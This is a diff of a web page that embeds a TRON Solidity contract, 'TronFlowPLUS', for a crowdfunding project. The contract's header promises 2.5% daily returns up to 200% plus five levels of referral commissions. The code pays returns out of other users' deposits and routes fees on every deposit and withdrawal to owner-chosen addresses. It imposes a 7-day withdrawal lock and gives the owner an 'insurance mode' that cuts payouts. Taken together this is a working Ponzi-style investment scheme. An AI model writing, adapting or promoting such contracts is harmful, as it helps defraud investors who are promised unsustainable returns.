@@ -1079,9 +1079,30 @@
 
         <div class="col-md-4 mb-4">
           <h4 class="text-white text-center">Verified Contract</h4>
-          <textarea class="smartcode">pragma solidity 0.4.25;
+          <textarea class="smartcode">
+pragma solidity ^0.4.25;
+/*
 
-contract TronFlowTRX {
+------------------------------------
+Crowdfunding & Crowdsharing project
+ Website :  https://tronflowplus.net  
+ Chanel :  https://t.me/tronflowplus_official
+------------------------------------ 
+ CONTRACT MANAGEMENT:
+------------------------------------
+2,5% daily ROI until 200% of your active capital
+4% direct referral 👨  
+3% referred level 2 👨🏽‍👨🏽‍  
+1% referred level 3 👨🏽‍👨🏽‍👨🏽‍  
+1% referred level 4 👨🏽‍👨🏽‍ 👨🏽‍ 👨🏽‍   
+1% referred level 5 👨🏽‍👨🏽‍ 👨🏽‍👨🏽‍ 👨🏽‍    
+------------------------------------
+Reinvest to generate compound interest
+------------------------------------
+*/
+
+
+contract TronFlowPLUS {
 
     using SafeMath for uint256;
 
@@ -1090,20 +1111,29 @@ contract TronFlowTRX {
     uint public totalInvested;
     uint public totalReinvest;
     uint public activedeposits;
-    uint private minDepositSize = 50000000; //50trx
+    uint private minDepositSize = 1000000000; //1000trx
     uint private interestRateDivisor = 1000000000000;
     uint public devCommission = 1;
     uint public commissionDivisor = 100;
-     
-    uint private releaseTime = 1602446400;  //11 october, 20pm UTC
+    uint private minuteRate = 290000; //2,5% ROI
+    uint private prelaunchTime =  1611878400;  
+    uint private releaseTime = 1612551600;  //5 february, 19pm UTC 
+    
+    
+    
+    uint public insurancemode = 0;
+    uint256 public insurancedep;
+    uint256 cycle = 0;
    
     
     address private feed1;
     address private feed2;
-
-	
-	
+    address private feed3;
+    address private insurance;
     address owner;
+    
+
+    
     struct Player {
         uint trxDeposit;
        
@@ -1117,14 +1147,57 @@ contract TronFlowTRX {
         uint256 aff3sum;
         uint256 aff4sum;
         uint256 aff5sum;
-        uint256 aff6sum;
-        uint256 aff7sum;
-        uint256 aff8sum;
-   
+        uint256  playerdeposit;
+        uint256  playerreinvest;
+        uint256 withdrawtime;
+    
+
         
     }
+    
+    
+        uint256 public last5;
+        address public last5ad;
+        uint256 public last4;
+        address public last4ad;
+        uint256 public last3;
+        address public last3ad;
+        uint256 public last2;
+        address public last2ad;
+        uint256 public last1;
+        address public last1ad;
+        
+    
+       
+         uint256 public top5;
+        address public top5ad;
+        uint256 public top4;
+        address public top4ad;
+        uint256 public top3;
+        address public top3ad;
+        uint256 public top2;
+        address public top2ad;
+        uint256 public top1;
+        address public top1ad;
+        
+        uint256 public lasttop5;
+        address public lasttop5ad;
+        uint256 public lasttop4;
+        address public lasttop4ad;
+        uint256 public lasttop3;
+        address public lasttop3ad;
+        uint256 public lasttop2;
+        address public lasttop2ad;
+        uint256 public lasttop1;
+        address public lasttop1ad;
+
+        
+
+     
 
     mapping(address => Player) public players;
+    
+    
     
     event Newbie(address indexed user, address indexed _referrer, uint _time);  
 	event NewDeposit(address indexed user, uint256 amount, uint _time);  
@@ -1133,11 +1206,13 @@ contract TronFlowTRX {
 	event Reinvest(address indexed user, uint256 amount, uint _time); 
 
 
-    constructor(address _marketingAddr, address _projectAddr) public {
+    constructor(address _marketingAddr, address _projectAddr, address _leaderAddr, address _insurance) public {
 
 		feed1 = _projectAddr;
 		feed2 = _marketingAddr;
+		feed3 = _leaderAddr;
 		owner = msg.sender;
+		insurance = _insurance;
 	}
 
 
@@ -1155,18 +1230,13 @@ contract TronFlowTRX {
       address _affAddr3 = players[_affAddr2].affFrom;
       address _affAddr4 = players[_affAddr3].affFrom;
       address _affAddr5 = players[_affAddr4].affFrom;
-      address _affAddr6 = players[_affAddr5].affFrom;
-      address _affAddr7 = players[_affAddr6].affFrom;
-      address _affAddr8 = players[_affAddr7].affFrom;
 
       players[_affAddr1].aff1sum = players[_affAddr1].aff1sum.add(1);
       players[_affAddr2].aff2sum = players[_affAddr2].aff2sum.add(1);
       players[_affAddr3].aff3sum = players[_affAddr3].aff3sum.add(1);
       players[_affAddr4].aff4sum = players[_affAddr4].aff4sum.add(1);
       players[_affAddr5].aff5sum = players[_affAddr5].aff5sum.add(1);
-      players[_affAddr6].aff6sum = players[_affAddr6].aff6sum.add(1);
-      players[_affAddr7].aff7sum = players[_affAddr7].aff7sum.add(1);
-      players[_affAddr8].aff8sum = players[_affAddr8].aff8sum.add(1);
+      
       
      
     }
@@ -1177,8 +1247,9 @@ contract TronFlowTRX {
 
     function deposit(address _affAddr) public payable {
     
-        
+        checkcycle();
         if (now >= releaseTime){
+            
         collect(msg.sender);
         
         }
@@ -1188,6 +1259,7 @@ contract TronFlowTRX {
         uint depositAmount = msg.value;
 
         Player storage player = players[msg.sender];
+        
 
         if (player.time == 0) {
             
@@ -1204,6 +1276,7 @@ contract TronFlowTRX {
             
             
             totalPlayers++;
+            player.withdrawtime =now + 7 days;
          
             if(_affAddr != address(0) && players[_affAddr].trxDeposit > 0){
                  emit Newbie(msg.sender, _affAddr, now);
@@ -1215,6 +1288,7 @@ contract TronFlowTRX {
             }
         }
         player.trxDeposit = player.trxDeposit.add(depositAmount);
+        player.playerdeposit = player.playerdeposit.add(depositAmount);
 
         distributeRef(msg.value, player.affFrom);  
 
@@ -1222,13 +1296,23 @@ contract TronFlowTRX {
         activedeposits = activedeposits.add(depositAmount);
         emit NewDeposit(msg.sender, depositAmount, now); 
         uint feedEarn = depositAmount.mul(devCommission).mul(8).div(commissionDivisor);
-         uint feedtrx1 = feedEarn.div(4);
-        uint feedtrx2 = feedtrx1 +feedEarn.div(2);
+         uint feedtrx1 = feedEarn.div(8);
+        uint feedtrx2 = feedtrx1 +feedEarn.div(4);
+        uint feedtrx3 = feedEarn.div(2);
          feed1.transfer(feedtrx1);
         feed2.transfer(feedtrx2);
+        feed3.transfer(feedtrx3);
+        
+        
+        getlast5(msg.value,msg.sender);
     }
 
     function withdraw() public {
+        
+        Player storage player = players[msg.sender];
+        checkcycle();
+      
+      if (now > player.withdrawtime){
         collect(msg.sender);
         
         require(players[msg.sender].interestProfit > 0);
@@ -1236,15 +1320,19 @@ contract TronFlowTRX {
         
         transferPayout(msg.sender, players[msg.sender].interestProfit);
         
+      }
+        
     }
 
     function reinvest() public {
+      checkcycle();
       collect(msg.sender);
       Player storage player = players[msg.sender];
       uint256 depositAmount = player.interestProfit;
       require(address(this).balance >= depositAmount);
       player.interestProfit = 0;
       player.trxDeposit = player.trxDeposit.add(depositAmount/2);
+      player.playerreinvest = player.playerreinvest.add(depositAmount);
 
       totalReinvest = totalReinvest.add(depositAmount);
       activedeposits = activedeposits.add(depositAmount/2);
@@ -1252,10 +1340,12 @@ contract TronFlowTRX {
       distributeRef(depositAmount, player.affFrom);
 
       uint feedEarn = depositAmount.mul(devCommission).mul(8).div(commissionDivisor);
-      uint feedtrx1 = feedEarn.div(4);
-      uint feedtrx2 = feedtrx1 +feedEarn.div(2);
+      uint feedtrx1 = feedEarn.mul(3).div(8);
+      uint feedtrx2 = feedEarn.mul(5).div(8);
       feed1.transfer(feedtrx1);
       feed2.transfer(feedtrx2);
+      
+      
         
         
     }
@@ -1264,11 +1354,11 @@ contract TronFlowTRX {
     function collect(address _addr) internal {
         Player storage player = players[_addr];
         
-    	uint256 vel = getvel();
+    	
 	
         uint secPassed = now.sub(player.time);
         if (secPassed > 0 && player.time > 0) {
-            uint collectProfit = (player.trxDeposit.mul(secPassed.mul(vel))).div(interestRateDivisor);
+            uint collectProfit = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
             player.interestProfit = player.interestProfit.add(collectProfit);
             if (player.interestProfit >= player.trxDeposit.mul(2)){
                 player.interestProfit = player.trxDeposit.mul(2);
@@ -1281,20 +1371,43 @@ contract TronFlowTRX {
     function transferPayout(address _receiver, uint _amount) internal {
         if (_amount > 0 && _receiver != address(0)) {
           uint contractBalance = address(this).balance;
+          uint payout;
             if (contractBalance > 0) {
-                uint payout = _amount > contractBalance ? contractBalance : _amount;
+                Player storage player = players[_receiver];
+                if (insurancemode == 0){
+                payout = _amount > contractBalance ? contractBalance : _amount;
                 totalPayout = totalPayout.add(payout);
                 activedeposits = activedeposits.sub(payout/2);
-                activedeposits = activedeposits.add(payout.mul(1).div(4));
+                activedeposits = activedeposits.add(payout.mul(2).div(10));
 
-                Player storage player = players[_receiver];
-                player.payoutSum = player.payoutSum.add(payout);
+                
+                player.payoutSum = player.payoutSum.add((payout * 7) / 10);
                 player.interestProfit = player.interestProfit.sub(payout);
                 player.trxDeposit = player.trxDeposit.sub(payout/2);
-                player.trxDeposit = player.trxDeposit.add(payout.mul(1).div(4));
+                player.trxDeposit = player.trxDeposit.add(payout.mul(2).div(10));
  
-                msg.sender.transfer(payout.mul(3).div(4));
+                msg.sender.transfer(payout.mul(7).div(10));
+                insurance.transfer(payout.mul(1).div(10));
+                
+                player.withdrawtime = now + 7 days;
                 emit Withdrawn(msg.sender, payout, now);
+     
+             
+              
+              }else {
+                  
+                  uint256 loss = player.playerdeposit - (player.payoutSum);
+                  if (loss > 0){
+                  payout = loss > contractBalance ? contractBalance : loss;
+                  totalPayout = totalPayout.add(payout);
+                  player.payoutSum = player.payoutSum.add(payout);
+                  msg.sender.transfer(payout);
+                  player.withdrawtime = now + 7 days;
+                  emit Withdrawn(msg.sender, payout, now);
+                  }
+                  
+              }
+                
             }
         }
     }
@@ -1308,14 +1421,12 @@ contract TronFlowTRX {
         address _affAddr3 = players[_affAddr2].affFrom;
         address _affAddr4 = players[_affAddr3].affFrom;
         address _affAddr5 = players[_affAddr4].affFrom;
-        address _affAddr6 = players[_affAddr5].affFrom;
-        address _affAddr7 = players[_affAddr6].affFrom;
-       address _affAddr8 = players[_affAddr7].affFrom;
+       
 
         uint256 _affRewards = 0;
 
         if (_affAddr1 != address(0)) {
-            _affRewards = (_trx.mul(5)).div(100);
+            _affRewards = (_trx.mul(4)).div(100);
             _allaff = _allaff.sub(_affRewards);
            
            if (now > releaseTime) {
@@ -1370,33 +1481,17 @@ contract TronFlowTRX {
             emit RefBonus(_affAddr4, msg.sender, 4, _affRewards, now);
         }
         
-        if (_affAddr5 != address(0)) {
-            _affRewards = 0;
+       if (_affAddr5 != address(0)) {
+            _affRewards = (_trx.mul(1)).div(100);
             _allaff = _allaff.sub(_affRewards);
+            if (now > releaseTime) {
+               collect(_affAddr5);
+                
+            }
             players[_affAddr5].affRewards = _affRewards.add(players[_affAddr5].affRewards);
             players[_affAddr5].trxDeposit = _affRewards.add(players[_affAddr5].trxDeposit);
-        }
-
-        if (_affAddr6 != address(0)) {
-            _affRewards = 0;
-            _allaff = _allaff.sub(_affRewards);
-            players[_affAddr6].affRewards = _affRewards.add(players[_affAddr6].affRewards);
-            players[_affAddr6].trxDeposit = _affRewards.add(players[_affAddr6].trxDeposit);
-
-        }
-
-        if (_affAddr7 != address(0)) {
-            _affRewards = 0;
-            _allaff = _allaff.sub(_affRewards);
-            players[_affAddr7].affRewards = _affRewards.add(players[_affAddr7].affRewards);
-            players[_affAddr7].trxDeposit = _affRewards.add(players[_affAddr7].trxDeposit);
-        }
-
-        if (_affAddr8 != address(0)) {
-            _affRewards = 0;
-            _allaff = _allaff.sub(_affRewards);
-            players[_affAddr8].affRewards = _affRewards.add(players[_affAddr8].affRewards);
-            players[_affAddr8].trxDeposit = _affRewards.add(players[_affAddr8].trxDeposit);
+            activedeposits = activedeposits.add(_affRewards);
+            emit RefBonus(_affAddr5, msg.sender, 5, _affRewards, now);
         }
 
         
@@ -1430,10 +1525,10 @@ contract TronFlowTRX {
 
       uint secPassed = now.sub(player.time);
       
-	  uint256 vel = getvel();
+	  
 	  
       if (secPassed > 0) {
-          uint collectProfit = (player.trxDeposit.mul(secPassed.mul(vel))).div(interestRateDivisor);
+          uint collectProfit = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
       }
       
       if (collectProfit.add(player.interestProfit) >= player.trxDeposit.mul(2)){
@@ -1445,33 +1540,139 @@ contract TronFlowTRX {
         }
     }
     
+    function depositInsurance() public payable{
+        require(msg.sender==owner && insurancemode == 1);
+        
+        insurancedep = insurancedep.add(msg.value);
+        
+    }
     
     
     
-     function getContractBalanceRate() public view returns (uint256) {
-		uint256 contractBalance = address(this).balance;
-	
-		uint256 contractBalancePercent = contractBalance.div(1000000000000); 
-		
-		if (contractBalancePercent >=40){
-		    contractBalancePercent = 40;
-		}
-		
-		return contractBalancePercent;
-	}
     
-       function getvel() public view returns (uint256) { 
-	
-		uint256 PercentRate = getContractBalanceRate();
-	
-		uint256 vel = 116000 + PercentRate.mul(11600) ; //vel from 1%
-		
+     
 
-		return vel;
-	}
 
-    
-    
+        function getlast5(uint256 _trx, address _sender) private {
+           
+        last5 = last4;
+        last5ad = last4ad;
+        last4 = last3;
+        last4ad = last3ad;
+        last3 = last2;
+        last3ad = last2ad;
+        last2 = last1;
+        last2ad = last1ad;
+        last1 = _trx;
+        last1ad = _sender;
+           
+           if (_trx > top5){
+               gettop5(_trx,_sender);
+           }
+            
+        }
+        
+        function gettop5(uint256 _trx, address _sender) private  {
+            
+      if (_trx > top1){
+          
+          top5 = top4;
+          top5ad = top4ad;
+          top4 = top3;
+          top4ad = top3ad;
+          top3 = top2;
+          top3ad = top2ad;
+          top2 = top1;
+          top2ad = top1ad;
+          top1 = _trx;
+          top1ad =_sender;
+          
+      }else if (_trx > top2){
+          
+          top5 = top4;
+          top5ad = top4ad;
+          top4 = top3;
+          top4ad = top3ad;
+          top3 = top2;
+          top3ad = top2ad;
+          top2 = _trx;
+          top2ad = _sender;
+          
+          
+      }else if (_trx > top3){
+          top5 = top4;
+          top5ad = top4ad;
+          top4 = top3;
+          top4ad = top3ad;
+          top3 = _trx;
+          top3ad = _sender;
+          
+          
+      }else if (_trx > top4){
+          
+          top5 = top4;
+          top5ad = top4ad;
+          top4 = _trx;
+          top4ad= _sender;
+          
+      }else{
+          top5 = _trx;
+          top5ad = _sender;
+      }
+      
+      
+      
+
+            
+        }
+        
+        
+        
+        function insurance_mode() public  {
+         require(msg.sender==owner);
+         
+         if (address(this).balance < 10000000000){  //will be manually activated, and only if balance < 10ktrx
+             insurancemode = 1;
+             
+         }
+         
+        }
+        
+        
+        
+        
+        
+        function checkcycle() private{
+            
+            uint256 check = (now - prelaunchTime)/ 1 days;
+            if (check > cycle){
+                cycle = check;
+                
+                
+                lasttop5 = top5;
+                lasttop5ad = top5ad;
+                lasttop4 = top4;
+                lasttop4ad = top4ad;
+                lasttop3 = top3;
+                lasttop3ad = top3ad;
+                lasttop2 = top2;
+                lasttop2ad = top2ad;
+                lasttop1 = top1;
+                lasttop1ad = top1ad;
+                
+                
+                top5 = 0;
+                top4 = 0;
+                top3 = 0;
+                top2 = 0;
+                top1 = 0;
+                
+                
+
+        
+            }
+        }
+        
      
     
 }
@@ -1512,7 +1713,9 @@ library SafeMath {
     }
 
 }
-}</textarea>
+
+
+</textarea>
 
 
 
